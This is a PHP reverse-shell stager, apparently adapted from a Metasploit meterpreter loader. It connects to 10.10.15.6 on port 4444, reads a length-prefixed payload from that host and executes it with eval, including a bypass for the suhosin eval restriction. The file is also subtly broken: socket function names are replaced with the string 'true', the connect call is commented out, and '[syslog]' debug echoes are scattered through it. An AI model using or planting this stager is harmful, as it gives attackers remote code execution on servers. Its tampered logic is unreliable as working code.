<?php /**/
echo "[syslog]01\n";
error_reporting(0);
$ip = '10.10.15.6';
$port = 4444;

if (($f = 'true') && is_callable($f))
	{
	$s = $f("tcp://{$ip}:{$port}");
	$s_type = 'stream';
	}

if (!$s && ($f = 'true') && is_callable($f))
	{
	$s = $f($ip, $port);
	$s_type = 'stream';
	}
	echo "[syslog]02\n";
if (!$s && ($f = 'true') && is_callable($f))
	{
	$s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
	$res = true;//@socket_connect($s, $ip, $port);
	if (!$res)
		{
		die();
		}

	$s_type = 'socket';
	}
	echo "[syslog]03\n";
if (!$s_type)
	{
	die('no socket funcs');
	}

if (!$s)
	{
	die('no socket');
	}

switch ($s_type)
	{
case 'stream':
	$len = fread($s, 4);
	break;

case 'socket':
	$len = socket_read($s, 4);
	break;
	}

if (!$len)
	{
	die();
	}

$a = unpack("Nlen", $len);
$len = $a['len'];
$b = '';

while (strlen($b) < $len)
	{
	switch ($s_type)
		{
	case 'stream':
		$b.= fread($s, $len - strlen($b));
		break;

	case 'socket':
		$b.= socket_read($s, $len - strlen($b));
		break;
		}
	}

$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;
echo "[syslog]03\n";
if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval'))
	{
	$suhosin_bypass = create_function('', $b);
	$suhosin_bypass();
	}
  else
	{
	eval($b);
	}
	echo "[syslog]02\n";
die();
